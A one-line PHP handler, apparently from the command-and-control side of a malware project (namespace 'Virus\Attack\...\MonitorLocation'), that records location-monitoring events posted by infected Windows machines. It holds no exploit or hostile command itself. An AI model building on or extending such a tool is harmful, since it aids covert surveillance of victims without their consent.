<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation\MonitorLocation $this */

$this->updateEventFromController($this->requestData->postCheck("event"), $this->requestData->postCheck("unixTime"));
